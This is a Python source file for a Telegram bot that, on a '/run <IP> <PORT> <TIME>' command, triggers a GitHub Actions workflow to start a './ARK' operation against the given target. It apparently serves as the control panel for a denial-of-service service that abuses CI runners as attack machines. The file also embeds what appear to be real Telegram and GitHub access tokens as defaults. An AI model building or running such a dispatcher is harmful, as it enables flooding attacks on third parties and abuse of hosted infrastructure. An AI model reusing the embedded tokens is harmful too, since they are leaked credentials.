import os
import threading
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# --- CONFIGURATION (Configure these via Render Environment Variables) ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8142270559:AAE9kfW5k7ZsA43C2A4pXXwELr7nF9vhEII")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "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")
GITHUB_REPO = "kumarxbarsha1278-pixel/gh"
# -----------------------------------------------------------------------

async def run_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handles the /run command. 
    Usage: /run <IP> <PORT> <TIME>
    """
    if len(context.args) < 3:
        await update.message.reply_text(
            "❌ **Invalid Format.**\n\nUse: `/run <IP> <PORT> <TIME>`\nExample: `/run 1.1.1.1 80 60`"
        )
        return

    ip = context.args[0]
    port = context.args[1]
    time_arg = context.args[2]

    await update.message.reply_text(
        f"⚡ **Sending task to GitHub Action Runner...**\n\n🌐 **IP:** {ip}\n🔌 **Port:** {port}\n⏱️ **Time:** {time_arg} seconds"
    )

    # API Payload targeting GitHub's dispatch engine
    url = f"https://api.github.com/repos/{GITHUB_REPO}/dispatches"
    headers = {
        "Authorization": f"Bearer {GITHUB_TOKEN}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
    }
    payload = {
        "event_type": "telegram_trigger",
        "client_payload": {
            "ip": ip,
            "port": port,
            "time": time_arg
        }
    }

    try:
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 204:
            await update.message.reply_text("🚀 **Success:** GitHub VM has started the `./ARK` operation!")
        else:
            await update.message.reply_text(f"❌ **GitHub Connection Error ({response.status_code}):**\n`{response.text}`")
    except Exception as e:
        await update.message.reply_text(f"💥 **Failed to communicate with GitHub:**\n`{e}`")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /start command."""
    await update.message.reply_text(
        "🤖 **ARK External VM Dispatcher Active!**\n\nType your target profile below:\n`/run <IP> <PORT> <TIME>`"
    )

# --- RENDER REQUIRED HEALTH CHECK WEB SERVER ---
class HealthServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot dispatching server is operational.")

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def log_message(self, format, *args):
        return  # Keep logs clean

def run_health_server():
    try:
        port = int(os.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), HealthServer)
        print(f"--> Web Server listening on port {port}")
        server.serve_forever()
    except Exception as e:
        print(f"--> [SERVER ERROR]: {e}")

# --- BOT EXECUTOR ---
def main():
    # Keep Render happy by spinning up the web port binding thread
    server_thread = threading.Thread(target=run_health_server, daemon=True)
    server_thread.start()

    print("--> Initializing Telegram Connection...")
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("run", run_command))

    application.run_polling()

if __name__ == "__main__":
    main()
